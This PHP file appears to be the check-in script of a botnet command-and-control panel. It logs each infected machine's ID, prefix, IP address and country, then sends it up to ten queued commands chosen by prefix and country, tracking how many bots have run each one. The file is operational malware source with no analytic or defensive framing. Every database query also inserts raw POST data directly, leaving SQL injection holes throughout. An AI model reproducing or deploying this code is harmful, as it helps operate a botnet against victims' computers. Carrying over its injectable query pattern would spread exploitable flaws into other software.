<?php

if(DIEHACK != true) exit;

if($config['autoprefix'] == 1){
    $test_bot = $mysqli->query('SELECT id,uid FROM bf_bots WHERE (prefix != \''.$_POST['prefix'].'\') AND (uid = \''.$_POST['uid'].'\') LIMIT 1');
    if($test_bot->uid == $_POST['uid']){
        $mysqli->query('update bf_bots set prefix = \''.$_POST['prefix'].'\', last_date = \''.$time.'\' where (id = \''.$test_bot->id.'\') LIMIT 1');
        print_data('no tasks');
        $mysqli->disconnect();
        unset($mysqli, $test_bot);
        exit;
    }
}

$mysqli->query("INSERT DELAYED INTO bf_country (code) VALUES ('".$country."')");
$mysqli->query("INSERT DELAYED INTO bf_bots_ip (prefix, uid, ip, country) VALUES ('".$_POST['prefix']."', '".$_POST['uid']."', '".$_SERVER['REMOTE_ADDR']."', '".$country."')");
	
$cmds = $mysqli->query('SELECT * FROM bf_cmds WHERE (enable=\'1\') AND ((prefix LIKE \''.$_POST['prefix'].'|%\') OR (prefix LIKE \'%|'.$_POST['prefix'].'|%\') OR (prefix = \'*\')) AND ((country LIKE \'%'.$country.'|%\') OR (country = \'*\')) AND ((online = \'1\') OR (online = \'2\')) AND ((max = 0) OR (count < max)) ORDER by dev, lt, id DESC LIMIT 10', null, null, false);
	
if(count($cmds) > 0){
    foreach($cmds as $cmd){
        $cs .= $cmd->cmd . "\r\n";
        
        if($bot->cmd_history[$cmd->id] != true) $mysqli->query('update bf_cmds set count = count+1 where (id = \''.$cmd->id.'\') LIMIT 1');
        $bot->cmd_history[$cmd->id] = true;
        
        if($cmd->lt == '2'){
            $mysqli->query("INSERT DELAYED INTO bf_bots (uid, prefix, country, ip, cmd_history, ver, notask, last_date, post_date) VALUES ('".$_POST['uid']."', '".$_POST['prefix']."', '".$country."', '".$_SERVER['REMOTE_ADDR']."', '".json_encode($bot->cmd_history)."', '".$ver."', '".$cmd->id."', '".$time."', '".$time."')");
            print_data(rtrim($cs, "\r\n"), true, true);
            exit;
        }
    }
}

if(!empty($cs)){
    $mysqli->query("INSERT DELAYED INTO bf_bots (uid, prefix, country, ip, cmd_history, ver, last_date, post_date) VALUES ('".$_POST['uid']."', '".$_POST['prefix']."', '".$country."', '".$_SERVER['REMOTE_ADDR']."', '".json_encode($bot->cmd_history)."', '".$ver."', '".$time."', '".$time."')");
    print_data(rtrim($cs, "\r\n"), false, true);
}else{
    $mysqli->query("INSERT DELAYED INTO bf_bots (uid, prefix, country, ip, ver, last_date, post_date) VALUES ('".$_POST['uid']."', '".$_POST['prefix']."', '".$country."', '".$_SERVER['REMOTE_ADDR']."', '".$ver."', '".$time."', '".$time."')");
    print_data('no tasks');
}

?>